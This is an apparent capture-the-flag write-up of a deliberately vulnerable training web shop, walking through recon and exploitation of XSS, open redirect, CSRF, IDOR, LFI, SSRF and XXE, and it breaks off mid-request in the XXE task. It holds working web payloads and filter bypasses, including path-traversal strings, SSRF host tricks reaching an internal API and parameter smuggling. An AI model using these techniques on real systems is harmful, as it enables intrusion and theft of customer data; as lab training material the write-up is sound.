# NahamStore

## Introduction:

Welcome to my another writeup! In this TryHackMe [NahamStore](https://tryhackme.com/room/nahamstore) room, there are tons of stuff that's worth learning, and it teaches you the basics of bug bounty hunting and web application hacking! Without further ado, let's dive in.

## Background

> In this room you will learn the basics of bug bounty hunting and web application hacking

> Difficulty: Medium

- Overall difficulty for me: Hard

```
NahamStore has been created to test what you've learnt with NahamSec's "Intro to Bug Bounty Hunting and Web Application Hacking" Udemy Course. Deploy the machine and once you've got an IP address move onto the next step!

Udemy Course created by @NahamSec | Labs created By @adamtlangley
```

```
To start the challenge you'll need to add an entry into your /etc/hosts or c:\windows\system32\drivers\etc\hosts file pointing to your deployed TryHackMe box.

For Example:

10.10.46.5                  nahamstore.thm

When enumerating subdomains you should perform it against the nahamstore.com domain. When you find a subdomain you'll need to add an entry into your /etc/hosts or c:\windows\system32\drivers\etc\hosts file pointing towards your deployed TryHackMe box IP address and substitute .com for .thm . For example if you discover the subdomain whatever.nahamstore.com you would add the following entry:

10.10.46.5          something.nahamstore.thm

You'll now be able to view http://something.nahamstore.thm in your browser.
The tasks can be performed in any order but we suggest starting with subdomain enumeration.
```

**Add `nahamstore.thm` domain to `/etc/hosts`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf]
└─# export RHOSTS=10.10.46.5  

┌──(root🌸siunam)-[~/ctf/thm/ctf]
└─# echo "$RHOSTS nahamstore.thm" | tee -a /etc/host
```

# Task 1 - Recon

```
Using a combination of subdomain enumeration, brute force, content discovery and fuzzing find all the subdomains you can and answer the below questions.
```

1. Jimmy Jones SSN:

> Note: To finish this question, you have to complete `Task 9 - RCE` question 2 first.

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# export RHOSTS=10.10.46.5
                                                                                                
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 84:6e:52:ca:db:9e:df:0a:ae:b5:70:3d:07:d6:91:78 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk0dfNL0GNTinnjUpwRlY3LsS7cLO2jAp3QRvFXOB+s+bPPk+m4duQ95Z6qagERl/ovdPsSJTdiPXy2Qpf+aZI4ba2DvFWfvFzfh9Jrx7rvzrOj0i0kUUwot9WmxhuoDfvTT3S6LmuFw7SAXVTADLnQIJ4k8URm5wQjpj86u7IdCEsIc126krLk2Nb7A3qoWaI+KJw0UHOR6/dhjD72Xl0ttvsEHq8LPfdEhPQQyefozVtOJ50I1Tc3cNVsz/wLnlLTaVui2oOXd/P9/4hIDiIeOI0bSgvrTToyjjTKH8CDet8cmzQDqpII6JCvmYhpqcT5nR+pf0QmytlUJqXaC6T
|   256 1a:1d:db:ca:99:8a:64:b1:8b:10:df:a9:39:d5:5c:d3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC/YPu9Zsy/Gmgz+aLeoHKA1L5FO8MqiyEaalrkDetgQr/XoRMvsIeNkArvIPMDUL2otZ3F57VBMKfgydtBcOIA=
|   256 f6:36:16:b7:66:8e:7b:35:09:07:cb:90:c9:84:63:38 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPAicOmkn8r1FCga8kLxn9QC7NdeGg0bttFiaaj11qec
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
|_http-title: NahamStore - Home
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     session: 
|_      httponly flag not set
8000/tcp open  http    syn-ack ttl 62 nginx 1.18.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**We can use `ffuf` to fuzz tthe subdomain:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://nahamstore.thm/ -H "Host: FUZZ.nahamstore.thm" -fw 125                  
[...]
www                     [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 436ms]
shop                    [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 446ms]
marketing               [Status: 200, Size: 2025, Words: 692, Lines: 42, Duration: 415ms]
stock                   [Status: 200, Size: 67, Words: 1, Lines: 1, Duration: 300ms]
```

Found subdomains: `www`, `shop`, `marketing`, `stock`

**Let's append those subdomains to `/etc/hosts`:**
```
10.10.46.5 nahamstore.thm www.nahamstore.thm shop.nahamstore.thm marketing.nahamstore.thm stock.nahamstore.thm
```

- `www.nahamstore.thm` and `shop.nahamstore.thm` redirects me to `nahamstore.thm`.

- `stock.nahamstore.thm` is a API endpoint:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl http://stock.nahamstore.thm                                                 
{"server":"stock.nahamstore.thm","endpoints":[{"url":"\/product"}]}

┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl http://stock.nahamstore.thm/product
{"items":[{"id":1,"name":"Hoodie + Tee","stock":56,"endpoint":"\/product\/1"},{"id":2,"name":"Sticker Pack","stock":293,"endpoint":"\/product\/2"}]}

┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl http://stock.nahamstore.thm/product/1
{"id":1,"name":"Hoodie + Tee","stock":56}

┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl http://stock.nahamstore.thm/product/2
{"id":2,"name":"Sticker Pack","stock":293}
```

- `marketing.nahamstore.thm` is a "Marketing Manager Campaigns":

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a1.png)

***Enumerating hidden directories:***

**nahamstore.thm:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# gobuster dir -u http://nahamstore.thm/ -w /usr/share/wordlists/dirb/common.txt -t 100              
[...]
/basket               (Status: 200) [Size: 2465]
/css                  (Status: 301) [Size: 178] [--> http://127.0.0.1/css/]
/js                   (Status: 301) [Size: 178] [--> http://127.0.0.1/js/] 
/login                (Status: 200) [Size: 3099]                           
/logout               (Status: 302) [Size: 0] [--> /]                      
/register             (Status: 200) [Size: 3138]                           
/robots.txt           (Status: 200) [Size: 13]                             
/returns              (Status: 200) [Size: 3628]                           
/search               (Status: 200) [Size: 3351]                           
/staff                (Status: 200) [Size: 2287]                           
/uploads              (Status: 301) [Size: 178] [--> http://127.0.0.1/uploads/]
```

**robots.txt:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl http://nahamstore.thm/robots.txt                            
User-agent: *
```

Nothing in `robots.txt`

> After finishing `Task 9 - RCE` question 2...

**In the `nahamstore-2020-dev` subdomain, we can see it's a blank page:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl http://nahamstore-2020-dev.nahamstore.thm/          
          
```

**We can enumerate hidden directory via `feroxbuster`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# feroxbuster -u http://nahamstore-2020-dev.nahamstore.thm/ -w /usr/share/wordlists/dirb/common.txt -t 100 -o ferox.txt
[...]
200      GET        0l        0w        0c http://nahamstore-2020-dev.nahamstore.thm/
302      GET        0l        0w        0c http://nahamstore-2020-dev.nahamstore.thm/api => /api/
302      GET        0l        0w        0c http://nahamstore-2020-dev.nahamstore.thm/api/customers => /api/customers/
[...]
[####################] - 11s     4614/4614    406/s   http://nahamstore-2020-dev.nahamstore.thm/ 
[####################] - 10s     4614/4614    444/s   http://nahamstore-2020-dev.nahamstore.thm/api 
[####################] - 10s     4614/4614    439/s   http://nahamstore-2020-dev.nahamstore.thm/api/customers
```

**Found `/api/` and `/api/customers` directory.**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl http://nahamstore-2020-dev.nahamstore.thm/api/
{"server":"nahamstore-2020-dev.nahamstore.thm"}
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl http://nahamstore-2020-dev.nahamstore.thm/api/customers/
["customer_id is required"]
```

When we reach to `/api/customers/`, it shows the above error message, and **it needs `customer_id` GET parameter.**

**Let's supply it and see what will happend:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl -s http://nahamstore-2020-dev.nahamstore.thm/api/customers/?customer_id=2 | jq
{
  "id": 2,
  "name": "Jimmy Jones",
  "email": "jd.jones1997@yahoo.com",
  "tel": "501-392-5473",
  "ssn": "{Redacted}"
}
```

**Found Jimmy Jones's ssn!**

# Task 2 - XSS

1. Enter an URL ( including parameters ) of an endpoint that is vulnerable to XSS

**When I was enumerating hidden directory in `marketing.nahamstore.thm` via `gobuster`, I found something weird:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# gobuster dir -u http://marketing.nahamstore.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300
[...]
/6e6055bd53afb9b6e4394d76e35838c9 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
/cfa5301358b9fcbe7aa45b1ceea088c6 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
```

It redirects me to `/?error`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a2.png)

**And it's vulnerable to reflected XSS!!**

2. What HTTP header can be used to create a Stored XXS

After registered an account, logged in in `nahamstore.thm`, set up "Address Book" and order an item, we see in the "Order Details" has a "User Agent" field:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a3.png)

Hmm... What if I can modify my HTTP User-Agent header to XSS payload?

**To do so, I'll:**

- Add any item to the basket, send to myself in `/basket`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a4.png)

- Click "Make Payment" and intercept the POST request:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a5.png)

- Modify the `User-Agent` to a XSS payload via Burp Suite:

```
User-Agent: <script>alert(1)</script>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a6.png)

And we found a store XSS vulnerability!!

3. What HTML tag needs to be escaped on the product page to get the XSS to work?

**In `nahamstore.thm/product`, we can see that it may vulnerable to XSS:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a7.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a8.png)

However, you can see that it's being injected in the `<title>` tag.

**To exploit this XSS vulnerability, I'll close the title tag `</title>`, and append a XSS payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a9.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a10.png)

4. What JavaScript variable needs to be escaped to get the XSS to work?

In `nahamstore.thm/search`'s View-Source, it has a javascript running:

**`nahamstore.thm/search?q=anything`:**
```js
var search = 'anything';
    $.get('/search-products?q=' + search,function(resp){
        if( resp.length == 0 ){

            $('.product-list').html('<div class="text-center" style="margin:10px">No matching products found</div>');

        }else {
            $.each(resp, function (a, b) {
                $('.product-list').append('<div class="col-md-4">' +
                    '<div class="product_holder" style="border:1px solid #ececec;padding: 15px;margin-bottom:15px">' +
                    '<div class="image text-center"><a href="/product?id=' + b.id + '"><img class="img-thumbnail" src="/product/picture/?file=' + b.img + '.jpg"></a></div>' +
                    '<div class="text-center" style="font-size:20px"><strong><a href="/product?id=' + b.id + '">' + b.name + '</a></strong></div>' +
                    '<div class="text-center"><strong>$' + b.cost + '</strong></div>' +
                    '<div class="text-center" style="margin-top:10px"><a href="/product?id=' + b.id + '" class="btn btn-success">View</a></div>' +
                    '</div>' +
                    '</div>');
            });
        }
    });
```

If we send a GET request to `/search?q=`, it'll GET `/search-products?q=` + our `search`.

**To exploit the XSS vulnearbility, we can:**

- Escape the `search` variable:

We can do this via using `'+<payload>+'` in URL encoded:

```js
%27%2Balert(1)%2B%27
```

> Note: `%27` means `'`, `%2B` means `+`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a11.png)

5. What hidden parameter can be found on the shop home page that introduces an XSS vulnerability.

**In the View-Source's `nahamstore.thm/`, we can see that there is a `q` GET parameter:**
```html
   <div class="row">
        <div class="col-md-6 col-md-offset-3">
            <div class="row">
                <form method="get" action="/search">
                    <div class="col-xs-9">
                        <input class="form-control" name="q" placeholder="Search For Products" value="">
                    </div>
                    <div class="col-cd-3" class="text-center">
                        <button type="submit" class="btn btn-default"><span class="glyphicon glyphicon-search"></span></button>
                    </div>
                </form>
            </div>
        </div>
    </div>
```

6. What HTML tag needs to be escaped on the returns page to get the XSS to work?

**We can first send a request to the `returns` page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a12.png)

**Inspect:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a13.png)

We can see that there is a `<textarea>` HTML tag.

We can exploit the XSS vulnerability by escaping the `<textarea>` tag, which is simply close that tag:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a14.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a15.png)

7. What is the value of the H1 tag of the page that uses the requested URL to create an XSS

**When we go to an non-existing page, an error page will be shown up:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a16.png)

**We can exploit it by pointing to a XSS payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a17.png)

8. What other hidden parameter can be found on the shop which can introduce an XSS vulnerability

**In the `/product` page, there is a `Discount Code` we can enter:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a18.png)

**Inspect:**

```html
<form method="post">
    <input type="hidden" name="add_to_basket" value="1">
    <div style="margin-bottom:10px"><input placeholder="Discount Code" class="form-control" name="discount" value=""></div>
   	<input type="submit" class="btn btn-success" value="Add To basket">
	<input type="button" class="btn btn-info checkstock" data-product-id="1" value="Check Stock">
</form>
```

When we click the `Add to basket` button, we'll send a POST request, and the POST parameters are `add_to_basket` and `discount`.

However, **when we use `discount` as a GET parameter, it's being reflected on the input field.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a19.png)

**And the XSS payload will fail if we don't escape the attribute:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a20.png)

**To exploit this, I'll:**

- Escape the attribute, then include the XSS payload into an event handler:

```html
<input placeholder="Discount Code" class="form-control" name="discount" value="" autofocus="" onfocus="alert(1)">
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a21.png)

# Task 3 - Open Redirect

```
Find two URL parameters that produce an Open Redirect
```

1. Open Redirect One

**We can fuzz hidden GET parameter in the home page of `nahamstore.thm`:**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://nahamstore.thm/?FUZZ=https://siunam321.github.io -fw 985 
[...]
r                       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 207ms]
```

Found **`r` GET parameter**.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a22.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a23.png)

It's indeed vulnerable to open redirect.

- Answer: `r`

2. Open Redirect Two

**When we try to access authenticated-only page, we'll be rediected to the login page, and a redirection parameter `?redirect_url=`:**
```
GET /login?redirect_url=/account/settings HTTP/1.1
[...]
```

**We can put an URL in the `redirect_url` GET parameter, and login:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a24.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a25.png)

# Task 4 - CSRF

```
It's possible to change other users data just by getting them to visit a website you've crafted. Explore the web apps forms to find what could be vulnerable to a CSRF attack.
```

1. What URL has no CSRF protection

In the `Change Password` page, it doesn't require CSRF token.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a26.png)

**Burp Suite:**
```
POST /account/settings/password HTTP/1.1
Host: nahamstore.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://nahamstore.thm
Connection: close
Referer: http://nahamstore.thm/account/settings/password
Cookie: session=efd89d84ebf66b1c8e5f86b66dd14a87; token=2709cc9dbd6939b2b9c2926f19df3870
Upgrade-Insecure-Requests: 1

change_password=password
```

2. What field can be removed to defeat the CSRF protection

**In the `Change Email` page, there is a CSRF protection:**

**View-Source:**
```html
<form method="post">
    <input type="hidden" name="csrf_protect" value="eyJkYXRhIjoiZXlKMWMyVnlYMmxrSWpvMExDSjBhVzFsYzNSaGJYQWlPaUl4TmpZek56TTROVEUxSW4wPSIsInNpZ25hdHVyZSI6ImZmYmQxOTk0NzNkODUzMjg2MTRlNWQ0Mzg4MWYyZmU4In0=">
    <div><label>Email:</label></div>
    <div><input class="form-control" name="change_email" value="test@gmail.com" ></div>
    <div style="margin-top:7px">
	<input type="submit" class="btn btn-success pull-right" value="Change Email"></div>
</form>
```

**To bypass the CSRF protection, we can just simply remove the `csrf_protect` POST parameter:**

**Before:**
```
POST /account/settings/email HTTP/1.1
[...]
csrf_protect=eyJkYXRhIjoiZXlKMWMyVnlYMmxrSWpvMExDSjBhVzFsYzNSaGJYQWlPaUl4TmpZek56TTROVEUxSW4wPSIsInNpZ25hdHVyZSI6ImZmYmQxOTk0NzNkODUzMjg2MTRlNWQ0Mzg4MWYyZmU4In0%3D&change_email=test%40gmail.com
```

**After:**
```
POST /account/settings/email HTTP/1.1
[...]
change_email=test%40gmail.com
```

3. What simple encoding is used to try and CSRF protect a form

**In the above `csrf_protect` POST parameter, we can see that the `value` is being encoded in `base64`:**
```
eyJkYXRhIjoiZXlKMWMyVnlYMmxrSWpvMExDSjBhVzFsYzNSaGJYQWlPaUl4TmpZek56TTROVEUxSW4wPSIsInNpZ25hdHVyZSI6ImZmYmQxOTk0NzNkODUzMjg2MTRlNWQ0Mzg4MWYyZmU4In0=
```

**We can decode that via `base64 -d`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# echo "eyJkYXRhIjoiZXlKMWMyVnlYMmxrSWpvMExDSjBhVzFsYzNSaGJYQWlPaUl4TmpZek56TTROVEUxSW4wPSIsInNpZ25hdHVyZSI6ImZmYmQxOTk0NzNkODUzMjg2MTRlNWQ0Mzg4MWYyZmU4In0=" | base64 -d
{"data":"eyJ1c2VyX2lkIjo0LCJ0aW1lc3RhbXAiOiIxNjYzNzM4NTE1In0=","signature":"ffbd199473d85328614e5d43881f2fe8"}

┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# echo "eyJ1c2VyX2lkIjo0LCJ0aW1lc3RhbXAiOiIxNjYzNzM4NTE1In0=" | base64 -d
{"user_id":4,"timestamp":"1663738515"}
```

**We can also see that the `Disable Account` page is using `base64` to encode CSRF token instead of random string.**
```html
<form method="post">
    <input type="hidden" name="action" value="disable">
    <input type="hidden" name="csrf_disable_protect" value="NA==">
    <p></p>
    <div style="margin-top:7px">
    <p>Please only click the below button if you are 100% sure you wish to disable your account. All your data will be lost.</p>
	<input type="submit" class="btn btn-danger pull-right" value="Disable Account"></div>
</form>
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# echo "NA==" | base64 -d                                                
4
```

# Task 5 - IDOR

```
In the web application, you'll find two IDOR vulnerabilities that allow you to read other users information.

1) An existing user has an address in New York, find the first line of the address.

2) The date and time of order ID 3
```

1. First Line of Address

**To exploit this IDOR vulnerability, we need:**

- Add an item to basket:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a27.png)

- Go to basket:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a28.png)

- Select your address:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a29.png)

**Burp Suite:**
```
POST /basket HTTP/1.1
[...]

address_id=5
```

Hmm... **What if I can read `address_id` is 4? or 3? and so on.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a30.png)

**Found it in `address_id=3`!**

2. Order ID 3 date and time

**After clicked the `Make payment` button, we'll be redirected to `http://nahamstore.thm/account/orders/<id>`.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a31.png)

**Then we can click `PDF Receipt`:**

**Burp Suite:**
```
POST /pdf-generator HTTP/1.1
[...]

what=order&id=4
```

Again, **what if I replaced the `id` into `3`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a32.png)

Error? `Order does not belong to this user_id`

Hmm... **What if I add another POST parameter called `user_id`?**

**Burp Suite:**
```
POST /pdf-generator HTTP/1.1
[...]

what=order&id=3&user_id=3
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a32.png)

Still didn't work...

**How about we URL encode the `&`? This will let the `3&user_id=3` becomes the value of `id`.**
```
POST /pdf-generator HTTP/1.1
[...]

what=order&id=3%26user_id=3
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a33.png)

It worked!

# Task 6 - LFI

```
Somewhere in the application is an endpoint which allows you to read local files. We've placed a document at /lfi/flag.txt for you to find the contents.
```

1. LFI Flag

**When we go to the `product` page, it's GETing the product image in `/product/picture/?file=`**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a34.png)

**The `file` GET parameter might vulnerable to LFI, or Local File Inclusion.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a35.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a36.png)

**Looks like there is a filter blocking path traversal?**

We might able to bypass it via **URL encoding:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a37.png)

Nope. How about **double URL encoding**?

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a38.png)

**Nope. Let's try `..//`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a39.png)

**It worked!! We can `curl` the flag:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl "http://nahamstore.thm/product/picture/?file=....//....//....//....//....//lfi/flag.txt"
{Redacted}
```

# Task 7 - SSRF

```
 The application has an SSRF vulnerability, see how you can exploit it to view an API that shouldn't be available.
```

1. Credit Card Number For Jimmy Jones

**In the `product` page, we can click the `Check Stock` button:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a40.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a41.png)

**Burp Suite:**
```
POST /stockcheck HTTP/1.1
[...]

product_id=1&server=stock.nahamstore.thm
```

We can see that it's sending a POST request to `/stockcheck`, and the `server` parameter looks interesting.

**What if we point it to another domain?**
```
product_id=1&server=nahamstore.thm
```

It outputs an error message for server invaild... So maybe we need to keep `stock.nahamstore.thm`.

**What if I point it to localhost?**
```
product_id=1&server=stock.nahamstore.thm@127.0.0.1
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a42.png)

Page not found...

> Note: `@` is a common bypass technique for SSRF.

**Hmm... What if we commented out the appended path via adding `#`?**

```
product_id=1&server=stock.nahamstore.thm@127.0.0.1#
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a43.png)

We're pointed to the home page!

**Now we can try to fuzz internal subdomains via `ffuf`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -u http://nahamstore.thm/stockcheck -X POST -d 'product_id=1&server=stock.nahamstore.thm@FUZZ.nahamstore.thm#' -t 100
[...]
internal-api
```

- Found internal subdomain: `internal-api`

**We now can go to the `internal-api` internal subdomain:**
```
POST /stockcheck HTTP/1.1
[...]
product_id=1&server=stock.nahamstore.thm@internal-api.nahamstore.thm#
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a44.png)

**And we found an endpoint! `/orders`**

```
POST /stockcheck HTTP/1.1
[...]
product_id=1&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders#
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a45.png)

```json
[
    {
        "id": "4dbc51716426d49f524e10d4437a5f5a",
        "endpoint": "/orders/4dbc51716426d49f524e10d4437a5f5a"
    },
    {
        "id": "5ae19241b4b55a360e677fdd9084c21c",
        "endpoint": "/orders/5ae19241b4b55a360e677fdd9084c21c"
    },
    {
        "id": "70ac2193c8049fcea7101884fd4ef58e",
        "endpoint": "/orders/70ac2193c8049fcea7101884fd4ef58e"
    }
]
```

**Let's find credit card number for Jimmy Jones!**

```
POST /stockcheck HTTP/1.1
[...]
product_id=1&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/5ae19241b4b55a360e677fdd9084c21c#
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a46.png)

```json
{
    "id": "5ae19241b4b55a360e677fdd9084c21c",
    "customer": {
        "id": 2,
        "name": "Jimmy Jones",
        "email": "jd.jones1997@yahoo.com",
        "tel": "501-392-5473",
        "address": {
            "line_1": "3999 Clay Lick Road",
            "city": "Englewood",
            "state": "Colorado",
            "zipcode": "80112"
        },
        "items": [
            {
                "name": "Hoodie + Tee",
                "cost": "25.00"
            }
        ],
        "payment": {
            "type": "MasterCard",
            "number": "{Redacted}",
            "expires": "11/2023",
            "CVV2": "223"
        }
    }
}
```

# Task 8 - XXE

```
Somewhere in the application. there is an endpoint that is vulnerable to an XXE attack. You can use this vulnerability to retrieve files on the server. We've hidden a flag in /flag.txt to find.
```

1. XXE Flag

**In the `stock.nahamstore.thm` subdomain, we can query one of the product's stock.**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl http://stock.nahamstore.thm/product      
{"items":[{"id":1,"name":"Hoodie + Tee","stock":56,"endpoint":"\/product\/1"},{"id":2,"name":"Sticker Pack","stock":293,"endpoint":"\/product\/2"}]}                                                                                                           

┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl http://stock.nahamstore.thm/product/1
{"id":1,"name":"Hoodie + Tee","stock":56}
```

**What if we send a POST request?**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl -X POST http://stock.nahamstore.thm/product/1
["Missing header X-Token"]
```

`Missing header X-Token`?? **Let's add that header in `curl`:**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl -X POST -H "X-Token: 1337" http://stock.nahamstore.thm/product/1
["X-Token 1337 is invalid"]
```

Invalid X-Token...

**When I fuzzed the GET parameter in `/product/1`, I successfully found a hidden GET parameter:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# ffuf -w /usr/share/seclists/Fuzzing/extensions-skipfish.fuzz.txt -u http://stock.nahamstore.thm/product/1?FUZZ -fs 41 
[...]
xml                     [Status: 200, Size: 88, Words: 4, Lines: 3, Duration: 205ms]
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NahamStore/images/a47.png)

**And when we supply the `X-Token` HTTP header:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NahamStore]
└─# curl -X POST -H "X-Token: 1337" http://stock.nahamstore.thm/product/1?xml
<?xml version="1.0"?>
<data><error>Invalid XML supplied</error></data>
```

It says `Invalid XML supplied`.

**How about we change the XML body and the content type?**

**Burp Suite Request:**
```
POST /product/1?xml HTTP/1.1
Host: stock.nahamstore.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/xml; charset=utf-8
Content-Length: 36
X-Token: 1337

<?xml version="1.0"?>
<data></data>
```

**Response:**
```xml
<?xml version="1.0"?>
<data><error>X-Token not supplied</error></data>
```

This error message means we didn't provide `X-Token` even if we have the HTTP header present. It means in XML mode the HTTP header is ignored and must be expecting a XML value.

**Burp Suite Request:**
```
POST /product/1?xml HTTP/1.1
Host: stock.nahamstore.thm
